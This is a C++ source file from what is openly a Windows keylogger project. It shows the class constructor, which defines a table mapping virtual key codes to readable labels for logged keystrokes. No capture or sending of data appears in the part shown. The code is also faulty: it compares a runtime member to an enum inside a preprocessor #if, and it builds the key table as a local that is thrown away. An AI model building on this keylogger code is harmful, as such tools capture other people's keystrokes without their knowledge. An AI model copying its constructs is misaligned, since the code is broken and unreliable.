#include "../../include/keylogger.h"

#include <Windows.h>
#include <sstream>
#include <map>

Keylogger::Keylogger(LoggingFormat loggingFormat, OSManager manager, bool mouseIgnore)
    : LOGGING_FORMAT(loggingFormat), manager_(manager), MOUSE_IGNORE(mouseIgnore)
{
    #if LOGGING_FORMAT == LoggingFormat::Default
        const std::map<int, std::string> VIRTUAL_KEY_NAME{ 
	        {VK_BACK, "[BACKSPACE]" },
	        {VK_RETURN,	"\n" },
	        {VK_SPACE,	"_" },
	        {VK_TAB,	"[TAB]" },
	        {VK_SHIFT,	"[SHIFT]" },
	        {VK_LSHIFT,	"[LSHIFT]" },
	        {VK_RSHIFT,	"[RSHIFT]" },
	        {VK_CONTROL,	"[CONTROL]" },
	        {VK_LCONTROL,	"[LCONTROL]" },
	        {VK_RCONTROL,	"[RCONTROL]" },
	        {VK_MENU,	"[ALT]" },
	        {VK_LWIN,	"[LWIN]" },
	        {VK_RWIN,	"[RWIN]" },
	        {VK_ESCAPE,	"[ESCAPE]" },
	        {VK_END,	"[END]" },
	        {VK_HOME,	"[HOME]" },
	        {VK_LEFT,	"[LEFT]" },
	        {VK_RIGHT,	"[RIGHT]" },
	        {VK_UP,		"[UP]" },
	        {VK_DOWN,	"[DOWN]" },
	        {VK_PRIOR,	"[PG_UP]" },
	        {VK_NEXT,	"[PG_DOWN]" },
	        {VK_OEM_PERIOD,	"." },
	        {VK_DECIMAL,	"." },
	        {VK_OEM_PLUS,	"+" },
	        {VK_OEM_MINUS,	"-" },
	        {VK_ADD,		"+" },
	        {VK_SUBTRACT,	"-" },
	        {VK_CAPITAL,	"[CAPSLOCK]" },
        };
    #endif
}